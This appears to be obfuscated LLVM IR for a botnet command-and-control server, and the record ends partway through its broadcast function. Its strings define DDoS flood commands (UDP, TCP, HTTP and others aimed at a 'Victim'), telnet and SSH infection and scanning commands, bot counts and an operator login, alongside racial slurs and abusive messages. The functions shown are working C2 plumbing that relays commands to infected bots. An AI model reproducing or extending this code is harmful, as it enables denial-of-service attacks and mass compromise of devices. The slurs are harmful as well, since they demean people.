; ModuleID = 'host/ir_fla/Zekrom.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.telnetdata_t, [8 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.17 = private unnamed_addr constant [33 x i8] c"%c]0;BOT COUNT: %d| NIGGAS: %d%c\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@accounts = internal global [10 x %struct.login_info] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[30mUsername:\1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [21 x i8] c"\1B[30mPassword:\1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [28 x i8] c"\1B[31mWRONG ANSWER BITCH!!\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [107 x i8] c"\1B[31m _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD\EF\BF\BD____  _\EF\BF\BD\EF\BF\BD_ \EF\BF\BD  _\EF\BF\BD\EF\BF\BD_\EF\BF\BD\EF\BF\BD\EF\BF\BD_  _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD_ _\EF\BF\BD_\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [97 x i8] c"\1B[31m\EF\BF\BD     _\EF\BF\BD \EF\BF\BD  _\EF\BF\BD   \EF\BF\BD \EF\BF\BD  \EF\BF\BD _\EF\BF\BD \EF\BF\BD   \EF\BF\BD   \EF\BF\BD \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD \EF\BF\BD  \EF\BF\BD\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [99 x i8] c"\1B[31m\EF\BF\BD __\EF\BF\BD\EF\BF\BD     \EF\BF\BD_____  \EF\BF\BD  \EF\BF\BD\EF\BF\BD_  \EF\BF\BD  \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD  \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD    \EF\BF\BD\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [85 x i8] c"\1B[31m  \EF\BF\BD        \EF\BF\BD    \EF\BF\BD    \EF\BF\BD   \EF\BF\BD  _\EF\BF\BD    \EF\BF\BD  \EF\BF\BD_    _\EF\BF\BD   \EF\BF\BD    \EF\BF\BD \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [89 x i8] c"\1B[31m   \EF\BF\BD____\EF\BF\BD _\EF\BF\BD____   _\EF\BF\BD   \EF\BF\BD  \EF\BF\BD     \EF\BF\BD     \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD   _\EF\BF\BD   _\EF\BF\BD  \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [81 x i8] c"\1B[31m       \EF\BF\BD  \EF\BF\BD    \EF\BF\BD   \EF\BF\BD    \EF\BF\BD  \EF\BF\BD     \EF\BF\BD            \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [71 x i8] c"\1B[31m          \EF\BF\BD        \EF\BF\BD                          \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [39 x i8] c"\0D\0A\1B[34m\09\09~[\1B[31mWelcome, %s\1B[34m  ]~\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [41 x i8] c"\1B[34m\09\09~[\1B[31mBOT COUNT: %d\1B[34m\09   ]~\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [13 x i8] c"\1B[32m> \1B[37m\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.37 = private unnamed_addr constant [29 x i8] c"BOT COUNT: %d | NIGGAS: %d\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.39 = private unnamed_addr constant [41 x i8] c"TELNET DEVICES: %d | TELNET STATUS: %d\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"STATS\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"INFECT\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"python telnet.py filtered.txt\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"REINFECT\00", align 1
@.str.44 = private unnamed_addr constant [29 x i8] c"python w.py filtered_ssh.txt\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"FILTER\00", align 1
@.str.46 = private unnamed_addr constant [93 x i8] c"sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"LOAD\00", align 1
@.str.48 = private unnamed_addr constant [29 x i8] c"python scan.py 376 LOAD 88 1\00", align 1
@.str.49 = private unnamed_addr constant [6 x i8] c"SCAN1\00", align 1
@.str.50 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.92 lol\00", align 1
@.str.51 = private unnamed_addr constant [6 x i8] c"SCAN2\00", align 1
@.str.52 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.93 lol\00", align 1
@.str.53 = private unnamed_addr constant [6 x i8] c"SCAN3\00", align 1
@.str.54 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.25 1\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"SCAN4\00", align 1
@.str.56 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.26 1\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"SCAN5\00", align 1
@.str.58 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.27\091\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"SCAN6\00", align 1
@.str.60 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 113.53 1\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"SCAN7\00", align 1
@.str.62 = private unnamed_addr constant [31 x i8] c"python scan.py 376 B 180.180 1\00", align 1
@.str.63 = private unnamed_addr constant [6 x i8] c"SCAN8\00", align 1
@.str.64 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 185.52 1\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"LUCKY\00", align 1
@.str.66 = private unnamed_addr constant [30 x i8] c"python scan.py 376 LUCKY 88 1\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"LUCKY2\00", align 1
@.str.68 = private unnamed_addr constant [31 x i8] c"python scan.py 376 LUCKY2 88 1\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"SCAN_OFF\00", align 1
@.str.70 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.72 = private unnamed_addr constant [29 x i8] c"\0D\0A\1B[31m~[ATTACK COMMANDS]~\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [62 x i8] c"\1B[31m~[\1B[37mUDP\1B[31m]~ \1B[37m!* UDP Victim Port Time 32 0 10\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [66 x i8] c"\1B[31m~[\1B[37mTCP\1B[31m]~ \1B[37m!* TCP Victim Port Time 32 all 0 10\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [54 x i8] c"\1B[31m~[\1B[37mSTD\1B[31m]~ \1B[37m!* STD Victim Port Time\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [48 x i8] c"\1B[31m~[\1B[37mHTTP\1B[31m]~ \1B[37m!* HTTP Url Time\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mJUNK\1B[31m]~ \1B[37m!* JUNK Victim Port Time\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mHOLD\1B[31m]~ \1B[37m!* HOLD Victim Port Time\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [50 x i8] c"\1B[31m~[\1B[37mKILL\1B[31m]~ \1B[37m!* KILLATTK | KILL\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [29 x i8] c"\1B[31m~[SCANNING COMMANDS]~\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [36 x i8] c"\1B[31m~[\1B[37mLOAD\1B[31m]~ \1B[37mLOAD\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN1 | SCAN2 | SCAN3 | SCAN4\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN5 | SCAN6 | SCAN7 | SCAN8\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mLUCKY\1B[31m]~ \1B[37mLUCKY | LUCKY2\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mSTOP\1B[31m]~ \1B[37mSCAN_OFF\0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mGENERAL COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSHELL\1B[31m]~ \1B[37m!* SH\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [46 x i8] c"\1B[31m~[\1B[37mBOTS\1B[31m]~ \1B[37m!* BOTS | BOTS\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [52 x i8] c"\1B[31m~[\1B[37mSTATUS\1B[31m]~ \1B[37m!* STATUS | STATUS\0D\0A\00", align 1
@.str.90 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSTATS\1B[31m]~ \1B[37mSTATS\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [35 x i8] c"\1B[31m~[\1B[37mMISC COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mINECTION FILTER\1B[31m]~ \1B[37mFILTER\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mTELNET INFECT\1B[31m]~ \1B[37mINFECT\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mREINFECT BOTS\1B[31m]~ \1B[37mREINFECT\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [44 x i8] c"\1B[31m~[\1B[37mCLEARSCREEN\1B[31m]~ \1B[37mCLEAR\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mLOGOUT\1B[31m]~ \1B[37mLOGOUT\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.103 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.105 = private unnamed_addr constant [15 x i8] c"server_log.txt\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.110 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.112 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"LEL\00", align 1
@.str.119 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.121 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1123493318, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1123493318, label %9
    i32 -24673487, label %13
    i32 -764315907, label %18
    i32 1234217974, label %27
    i32 1684965795, label %29
    i32 -183505701, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -24673487, i32 1234217974
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %7, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 -764315907, i32 1234217974
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 1234217974, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 1684965795, i32 -183505701
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -1123493318, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  ret i32 %40

loopEnd:                                          ; preds = %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -2124751571, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2124751571, label %10
    i32 -2066829495, label %20
    i32 1624232270, label %23
    i32 1226967574, label %24
    i32 -1252148872, label %29
    i32 1545067010, label %38
    i32 -1917379451, label %40
    i32 -646522478, label %43
    i32 -1831024963, label %45
    i32 960810995, label %50
    i32 -1516734687, label %62
    i32 -1170321405, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -2066829495, i32 1624232270
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -2124751571, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 1226967574, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -1252148872, i32 1545067010
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #8
  %37 = icmp ne i32 %36, 0
  store i32 1545067010, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -1917379451, i32 -646522478
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 1226967574, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -1831024963, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 960810995, i32 -1170321405
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 -1516734687, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -1831024963, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  store i32 %14, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -646604030, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -646604030, label %first
    i32 -1762079962, label %17
    i32 1845008997, label %18
    i32 664457886, label %36
    i32 539196942, label %40
    i32 -1898334232, label %45
    i32 1466429115, label %53
    i32 266073136, label %57
    i32 -389189264, label %65
    i32 -501423963, label %66
    i32 1109675731, label %70
    i32 -369734239, label %78
    i32 -1892893, label %88
    i32 1411563844, label %99
    i32 -2110901892, label %107
    i32 360179436, label %110
    i32 -1351042048, label %113
    i32 -1068488871, label %114
    i32 -1512578670, label %117
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp eq i32 %.reload, 0
  %16 = select i1 %15, i32 -1762079962, i32 1845008997
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1845008997, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = call i64 @strlen(i8* %19) #8
  %21 = add i64 %20, 10
  %22 = call noalias i8* @malloc(i64 %21) #7
  store i8* %22, i8** %8, align 8
  %23 = load i8*, i8** %8, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = call i64 @strlen(i8* %24) #8
  %26 = add i64 %25, 10
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 %26, i32 1, i1 false)
  %27 = load i8*, i8** %8, align 8
  %28 = load i8*, i8** %4, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #7
  %30 = load i8*, i8** %8, align 8
  call void @trim(i8* %30)
  %31 = call i64 @time(i64* %9) #7
  %32 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %32, %struct.tm** %10, align 8
  %33 = load %struct.tm*, %struct.tm** %10, align 8
  %34 = call i8* @asctime(%struct.tm* %33) #7
  store i8* %34, i8** %11, align 8
  %35 = load i8*, i8** %11, align 8
  call void @trim(i8* %35)
  store i32 0, i32* %12, align 4
  store i32 664457886, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %12, align 4
  %38 = icmp slt i32 %37, 1000000
  %39 = select i1 %38, i32 539196942, i32 -1512578670
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %12, align 4
  %42 = load i32, i32* %5, align 4
  %43 = icmp eq i32 %41, %42
  %44 = select i1 %43, i32 -389189264, i32 -1898334232
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %12, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %47
  %49 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %48, i32 0, i32 1
  %50 = load i8, i8* %49, align 4
  %51 = icmp ne i8 %50, 0
  %52 = select i1 %51, i32 -501423963, i32 1466429115
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %7, align 4
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -389189264, i32 266073136
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %12, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %59
  %61 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 4
  %63 = icmp ne i32 %62, 0
  %64 = select i1 %63, i32 -501423963, i32 -389189264
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1068488871, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %7, align 4
  %68 = icmp ne i32 %67, 0
  %69 = select i1 %68, i32 1109675731, i32 -1892893
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %12, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %72
  %74 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 4
  %76 = icmp ne i32 %75, 0
  %77 = select i1 %76, i32 -369734239, i32 -1892893
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %12, align 4
  %80 = call i64 @send(i32 %79, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i64 5, i32 16384)
  %81 = load i32, i32* %12, align 4
  %82 = load i8*, i8** %6, align 8
  %83 = load i8*, i8** %6, align 8
  %84 = call i64 @strlen(i8* %83) #8
  %85 = call i64 @send(i32 %81, i8* %82, i64 %84, i32 16384)
